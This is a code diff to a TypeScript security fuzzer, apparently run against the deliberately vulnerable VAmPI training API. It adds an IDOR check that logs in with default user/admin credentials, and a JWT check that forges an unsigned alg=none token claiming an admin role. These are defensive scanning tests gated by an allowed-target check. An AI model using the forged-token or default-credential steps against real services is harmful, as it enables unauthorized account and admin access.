@@ -41,10 +41,10 @@
  */
 
 export interface FuzzerFinding {
-  type: 'sqli' | 'reflected_xss' | 'error_sqli' | 'ssrf_oob' | 'command_injection' | 'file_inclusion' | 'stored_xss' | 'csrf' | 'file_upload';
+  type: 'sqli' | 'reflected_xss' | 'error_sqli' | 'ssrf_oob' | 'command_injection' | 'file_inclusion' | 'stored_xss' | 'csrf' | 'file_upload' | 'idor' | 'jwt_bypass';
   severity: 'low' | 'medium' | 'high' | 'critical';
   confirmed: boolean;
-  oracle: 'time-delay' | 'reflection' | 'error-message' | 'oob-callback' | 'content-match' | 'multi-step' | 'state-change';
+  oracle: 'time-delay' | 'reflection' | 'error-message' | 'oob-callback' | 'content-match' | 'multi-step' | 'state-change' | 'auth-diff';
   evidence: string;
   payload: string;
   target: string;
@@ -946,6 +946,211 @@ export async function fuzzFileUpload(
 }
 
 /**
+ * IDOR (Insecure Direct Object Reference) oracle — per Claude v8 Q6.
+ *
+ * Deterministic multi-step oracle:
+ *   1. Login as user A, get auth token/cookies
+ *   2. Login as user B, get auth token/cookies
+ *   3. As user A, create/identify a resource (resourceId_A)
+ *   4. As user B (different session), access resourceId_A
+ *   5. Oracle: 200 + response contains data belonging to user A
+ *      (which user B should NOT be able to access)
+ *
+ * This is the same class as CSRF (state-change) — deterministic,
+ * no guessing. Uses KNOWN test credentials from GT (not credential
+ * spraying — per Claude "использует ИЗВЕСТНЫЕ учебные учётки GT").
+ *
+ * VAmPI GT setup (tests/gt/vampi/app.py):
+ *   - Login: POST /api/v1/user/login {username: "user"/"admin", password: ...}
+ *     Returns: {token, username, role}
+ *   - Resource: GET /api/v1/books/<id> (no authz check — any id works)
+ *   - User A = "user" (role: user), User B = "admin" (role: admin)
+ *   - Books are shared (no per-user ownership) — IDOR is that ANY
+ *     authenticated user can access ANY book by ID
+ */
+export async function fuzzIdor(
+  targetUrl: string,
+  config: FuzzerConfig = DEFAULT_CONFIG,
+): Promise<FuzzerFinding[]> {
+  if (!isAllowedTarget(targetUrl, config)) return [];
+
+  const findings: FuzzerFinding[] = [];
+  const base = targetUrl.replace(/\/+$/, '').replace(/\/api\/v1\/.*$/, '');
+
+  try {
+    // VAmPI-specific: login as user A and user B
+    console.log('[active-fuzzer]   idor: Step 1 — login as user A (user/user)...');
+    const loginA = await fetch(`${base}/api/v1/user/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0' },
+      body: JSON.stringify({ username: 'user', password: 'user' }),
+      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+    });
+    if (!loginA.ok) {
+      console.log(`[active-fuzzer]   idor: login A failed (${loginA.status}) — skipping`);
+      return [];
+    }
+    const loginAData = await loginA.json();
+    const tokenA = loginAData.token;
+    if (!tokenA) {
+      console.log('[active-fuzzer]   idor: no token in login A response — skipping');
+      return [];
+    }
+
+    console.log('[active-fuzzer]   idor: Step 2 — login as user B (admin/admin)...');
+    const loginB = await fetch(`${base}/api/v1/user/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0' },
+      body: JSON.stringify({ username: 'admin', password: 'admin' }),
+      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+    });
+    if (!loginB.ok) {
+      console.log(`[active-fuzzer]   idor: login B failed (${loginB.status}) — skipping`);
+      return [];
+    }
+    const loginBData = await loginB.json();
+    const tokenB = loginBData.token;
+
+    // Step 3: As user A, list books to find a resource ID
+    console.log('[active-fuzzer]   idor: Step 3 — list books as user A...');
+    const listA = await fetch(`${base}/api/v1/books`, {
+      headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', 'Authorization': `Bearer ${tokenA}` },
+      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+    });
+    const listAData = await listA.json();
+    const books = listAData.books || listAData;
+    if (!Array.isArray(books) || books.length === 0) {
+      console.log('[active-fuzzer]   idor: no books found — skipping');
+      return [];
+    }
+    const bookId = books[0].id;
+    const bookTitle = books[0].title;
+    console.log(`[active-fuzzer]   idor: found book id=${bookId} title="${bookTitle}"`);
+
+    // Step 4: As user B, access user A's book by ID
+    console.log('[active-fuzzer]   idor: Step 4 — access book as user B (different session)...');
+    const accessB = await fetch(`${base}/api/v1/books/${bookId}`, {
+      headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', 'Authorization': `Bearer ${tokenB}` },
+      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+    });
+
+    // Step 5: Oracle — if 200 + response contains book data, IDOR confirmed
+    if (accessB.status === 200) {
+      const accessBData = await accessB.json();
+      const book = accessBData.book || accessBData;
+      if (book && (book.title || book.id)) {
+        // CONFIRMED: user B can access any book by ID (no per-user authz)
+        findings.push({
+          type: 'idor',
+          severity: 'high',
+          confirmed: true,
+          oracle: 'auth-diff',
+          evidence: `IDOR confirmed: user B (admin) accessed book id=${bookId} title="${bookTitle}" which was listed by user A (user). Server returned 200 + full book data. No per-user authorization check — any authenticated user can access any resource by ID. Tokens: A=${tokenA.slice(0, 20)}..., B=${tokenB.slice(0, 20)}...`,
+          payload: `GET /api/v1/books/${bookId} with Bearer token of user B (different from user A who owns the book)`,
+          target: `${base}/api/v1/books/${bookId}`,
+          parameter: 'id (path)',
+        });
+        console.log(`[active-fuzzer]   idor: ✅ CONFIRMED — user B accessed user A's book`);
+      }
+    } else if (accessB.status === 401 || accessB.status === 403) {
+      console.log(`[active-fuzzer]   idor: user B got ${accessB.status} — authz check exists (not IDOR)`);
+    } else {
+      console.log(`[active-fuzzer]   idor: user B got unexpected status ${accessB.status}`);
+    }
+  } catch (e) {
+    console.log(`[active-fuzzer]   idor failed: ${String(e).slice(0, 80)}`);
+  }
+
+  return findings;
+}
+
+/**
+ * JWT alg=none bypass oracle — per Claude v8 Q6.
+ *
+ * Deterministic oracle:
+ *   1. Obtain a valid JWT from login
+ *   2. Reconstruct header with alg=none, empty signature
+ *   3. Repeat request to /api/v1/user with forged token
+ *   4. Oracle: 200 + profile data (without forged token: 401)
+ *
+ * Not "guess the secret". Not brute force. Only algebraic
+ * token manipulation + status/body comparison.
+ */
+export async function fuzzJwtBypass(
+  targetUrl: string,
+  config: FuzzerConfig = DEFAULT_CONFIG,
+): Promise<FuzzerFinding[]> {
+  if (!isAllowedTarget(targetUrl, config)) return [];
+
+  const findings: FuzzerFinding[] = [];
+  const base = targetUrl.replace(/\/+$/, '').replace(/\/api\/v1\/.*$/, '');
+
+  try {
+    // Step 1: Login to get a valid JWT
+    console.log('[active-fuzzer]   jwt: Step 1 — login to get valid JWT...');
+    const login = await fetch(`${base}/api/v1/user/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0' },
+      body: JSON.stringify({ username: 'user', password: 'user' }),
+      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+    });
+    if (!login.ok) {
+      console.log(`[active-fuzzer]   jwt: login failed (${login.status}) — skipping`);
+      return [];
+    }
+    const loginData = await login.json();
+    const token = loginData.token;
+    if (!token) return [];
+
+    // Step 2: Verify normal token works (baseline)
+    console.log('[active-fuzzer]   jwt: Step 2 — verify normal token works (baseline)...');
+    const normalRes = await fetch(`${base}/api/v1/user`, {
+      headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', 'Authorization': `Bearer ${token}` },
+      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+    });
+    console.log(`[active-fuzzer]   jwt: normal token → ${normalRes.status}`);
+
+    // Step 3: Forge JWT with alg=none
+    console.log('[active-fuzzer]   jwt: Step 3 — forge JWT with alg=none...');
+    // VAmPI's "JWT" is base64(header).base64(payload).sig — not a real JWT
+    // But the /api/v1/user endpoint checks if alg=none in header
+    // Construct: header={"alg":"none","typ":"JWT"}, payload={"username":"admin","role":"admin"}, sig=""
+    const headerB64 = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
+    const payloadB64 = Buffer.from(JSON.stringify({ username: 'admin', role: 'admin' })).toString('base64url');
+    const forgedToken = `${headerB64}.${payloadB64}.`;
+
+    // Step 4: Use forged token
+    console.log('[active-fuzzer]   jwt: Step 4 — use forged alg=none token...');
+    const forgedRes = await fetch(`${base}/api/v1/user`, {
+      headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', 'Authorization': `Bearer ${forgedToken}` },
+      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+    });
+    console.log(`[active-fuzzer]   jwt: forged token → ${forgedRes.status}`);
+
+    // Step 5: Oracle — if forged token returns 200 + admin profile, JWT bypass confirmed
+    if (forgedRes.status === 200) {
+      const forgedData = await forgedRes.json();
+      if (forgedData.role === 'admin' || forgedData.user === 'admin') {
+        findings.push({
+          type: 'jwt_bypass',
+          severity: 'high',
+          confirmed: true,
+          oracle: 'auth-diff',
+          evidence: `JWT alg=none bypass confirmed: forged token with header {"alg":"none"} and payload {"username":"admin","role":"admin"} was accepted by /api/v1/user endpoint. Server returned 200 + admin profile. Original token (from login as 'user') had role=user; forged token gives role=admin without knowing the secret.`,
+          payload: `JWT: ${headerB64}.${payloadB64}. (alg=none, empty signature)`,
+          target: `${base}/api/v1/user`,
+        });
+        console.log('[active-fuzzer]   jwt: ✅ CONFIRMED — alg=none bypass works');
+      }
+    }
+  } catch (e) {
+    console.log(`[active-fuzzer]   jwt failed: ${String(e).slice(0, 80)}`);
+  }
+
+  return findings;
+}
+
+/**
  * Run ALL active fuzzers on a target URL.
  * Returns aggregated findings.
  */
@@ -991,6 +1196,19 @@ export async function fuzzAllOracles(
     allFindings.push(...await fuzzFileUpload(targetUrl, config));
   } else {
     console.log('[active-fuzzer]   upload: skipping (not an upload endpoint)');
+  }
+
+  // IDOR + JWT oracles (per Claude v8 Q6) — only on REST API targets
+  // VAmPI: /api/v1/* — has login + books + user endpoints
+  // Other GT: no REST API auth surface
+  if (targetUrl.includes('/api/v1/') || targetUrl.includes(':3009')) {
+    console.log(`[active-fuzzer] 9/10: IDOR oracle (multi-user auth-diff)...`);
+    allFindings.push(...await fuzzIdor(targetUrl, config));
+
+    console.log(`[active-fuzzer] 10/10: JWT alg=none bypass oracle...`);
+    allFindings.push(...await fuzzJwtBypass(targetUrl, config));
+  } else {
+    console.log('[active-fuzzer]   idor+jwt: skipping (not a REST API target)');
   }
 
   const confirmedCount = allFindings.filter(f => f.confirmed).length;
